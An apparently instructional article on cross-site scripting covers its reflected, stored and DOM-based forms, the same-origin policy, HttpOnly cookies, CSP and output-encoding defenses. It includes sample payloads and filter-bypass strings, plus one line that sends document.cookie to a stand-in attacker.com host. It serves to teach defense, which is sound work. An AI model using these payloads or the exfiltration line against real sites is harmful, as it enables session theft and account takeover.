# Cross-Site Scripting (XSS)

Cross-site scripting is what happens when a web application takes user-supplied content and renders it in a browser without properly encoding it first. The browser can't tell the difference between legitimate page scripts and injected ones, so it runs both. The result: an attacker's JavaScript executes in the context of your application, in your user's browser, with access to everything your legitimate scripts have access to.

It's one of the most prevalent vulnerabilities on the web, and it's been that way for a long time. Understanding it properly requires knowing not just the mechanics but also why the standard defenses work, and why some widely recommended mitigations are weaker than people think.

## Three Types

### Reflected XSS

The malicious script is embedded in a URL or form parameter. The server takes that input and reflects it back in the HTTP response without encoding it. The script only runs for users who visit the crafted link; nothing is stored server-side.

Example: a search page that echoes the query back to the user:

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

The response body might contain:

```html
<p>Results for: <script>alert(document.cookie)</script></p>
```

The browser parses this, hits the script tag, and executes it. Reflected XSS requires social engineering to deliver (phishing emails, malicious links), but it's very exploitable once someone clicks.

### Stored XSS

The payload is persisted in a database, file, or some other storage mechanism and then rendered for other users. A comment field, a username, a profile bio, a forum post. Any of those could be a vector if the output isn't encoded.

Stored XSS is more dangerous than reflected because it doesn't require delivering a link to every victim. Post it once, and anyone who views the affected page gets hit. This is why stored XSS in high-traffic areas (admin panels, public profiles, chat logs) is particularly severe.

### DOM-Based XSS

The vulnerability lives entirely in client-side JavaScript. The server may be completely uninvolved. DOM XSS happens when JavaScript reads from an attacker-controllable source (like `location.hash`, `document.referrer`, or `window.name`) and writes it into the DOM in an unsafe way.

```javascript
// Vulnerable: reads from the URL hash and writes raw HTML
document.getElementById('output').innerHTML = location.hash.slice(1);
```

If someone visits `https://example.com/page#<img src=x onerror=alert(1)>`, that event handler fires. No HTTP request to the server carries the payload. Traditional server-side output encoding doesn't help here because the server never sees the input.

## What an Attacker Can Do

JavaScript running in a victim's browser context has a lot of power:

**Cookie theft**: `document.cookie` exposes all non-HttpOnly cookies. An attacker can exfiltrate a session cookie to their own server and use it to impersonate the victim.

```javascript
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
```

**Session hijacking**: Steal the session token, replay it elsewhere. Instant account takeover without ever knowing the password.

**Keylogging**: Attach event listeners to capture every keystroke, then periodically beacon the data out.

**Form hijacking**: Intercept form submissions, including login forms, and redirect the credentials.

**Redirects and phishing**: Silently redirect to a lookalike login page while the user thinks they're still on the legitimate site.

**BeEF (Browser Exploitation Framework)**: Hook the victim's browser to a command-and-control framework that lets an attacker run further attacks interactively. Fingerprint the browser, scan internal networks from the browser, exploit browser plugins.

## The Same-Origin Policy and Why XSS Defeats It

The Same-Origin Policy (SOP) is the browser's primary security boundary. It prevents scripts on `attacker.com` from reading responses from `bank.com`. Origins are defined by the combination of scheme, host, and port. `https://example.com:443` and `http://example.com:80` are different origins.

XSS defeats the SOP entirely because the injected script isn't running on `attacker.com`. It's running on the victim site's origin. From the browser's perspective, it's the same as any other script on that page. It can read cookies, access localStorage, make authenticated requests, and read the responses, all as the legitimate origin.

This is the core reason XSS is treated as a critical vulnerability: it collapses the trust boundary that every other browser security mechanism depends on.

## HttpOnly Cookies

Setting the `HttpOnly` flag on a cookie prevents JavaScript from accessing it via `document.cookie`. This is a genuinely useful mitigation because it blocks the most common XSS exploitation path: direct cookie theft.

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

But don't mistake it for a fix. An attacker with XSS can still make authenticated HTTP requests from the victim's browser (the browser attaches cookies automatically), can still read page content, can still log keystrokes, and can still perform actions on behalf of the user. HttpOnly reduces the severity of XSS and blocks one specific attack path; it doesn't eliminate the vulnerability.

## Content Security Policy

CSP is an HTTP response header that tells the browser what script sources are permitted. A strict policy can prevent injected scripts from running even if XSS exists.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

This tells the browser to only execute scripts from the same origin or the specified CDN. Inline scripts (like `<script>alert(1)</script>`) are blocked by default when CSP is active.

A few important caveats: CSP is notoriously easy to misconfigure. Allowing `'unsafe-inline'` or overly broad wildcards (like `script-src *`) defeats the purpose. `strict-dynamic` is the modern approach for CSP that actually works at scale. Also, CSP doesn't help with DOM-based XSS where no new scripts are injected; it only restricts script execution.

CSP is valuable defense in depth but it's not a substitute for output encoding.

## Prevention

### Output Encoding

This is the primary fix. Before rendering any user-supplied data in HTML, encode the special characters so the browser treats them as text content, not markup.

| Character | HTML Entity |
|-----------|-------------|
| `<`       | `&lt;`      |
| `>`       | `&gt;`      |
| `&`       | `&amp;`     |
| `"`       | `&quot;`    |
| `'`       | `&#x27;`    |

The context matters. Data inserted into HTML attribute values, JavaScript strings, CSS, and URLs all require different encoding schemes. Most modern templating engines handle HTML context encoding automatically (Jinja2, Blade, Handlebars). The danger is when you reach for raw HTML rendering.

### Avoid innerHTML

The single most common source of DOM XSS in modern single-page apps is `innerHTML`. Don't use it to insert untrusted content. Use `textContent` instead, which treats the value as plain text and never parses it as HTML.

```javascript
// Dangerous
element.innerHTML = userInput;

// Safe
element.textContent = userInput;
```

If you genuinely need to render some HTML from user input (rich text editors, markdown renderers), use a dedicated sanitization library like DOMPurify. Don't write your own sanitizer.

### CSP Headers

Add a Content Security Policy. At minimum, restrict `script-src` to known good origins and avoid `'unsafe-inline'`. A `nonce`-based or `hash`-based policy is more robust for applications that have legitimate inline scripts.

## Common Bypasses

Script tag filtering, where the server strips `<script>` tags, is not a defense. There are too many ways around it.

**Event handlers**: No script tag required.

```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<div onmouseover="alert(1)">hover me</div>
```

**JavaScript URIs in href/src attributes**:

```html
<a href="javascript:alert(1)">click me</a>
```

**Filter evasion tricks**: Case variation (`<ScRiPt>`), broken tags that some parsers reconstruct, null bytes, HTML entities for angle brackets in certain contexts.

**SVG and MathML**: Both support script execution and event handlers, and they're sometimes handled differently by HTML parsers and WAF rules.

**DOM clobbering**: Abusing HTML elements with specific `id` or `name` attributes to override global JavaScript variables, sometimes enabling XSS where it otherwise wouldn't be possible.

The lesson here is that trying to filter out "bad" input is a losing game. The right approach is encoding output so that no matter what the input contains, it renders as text.
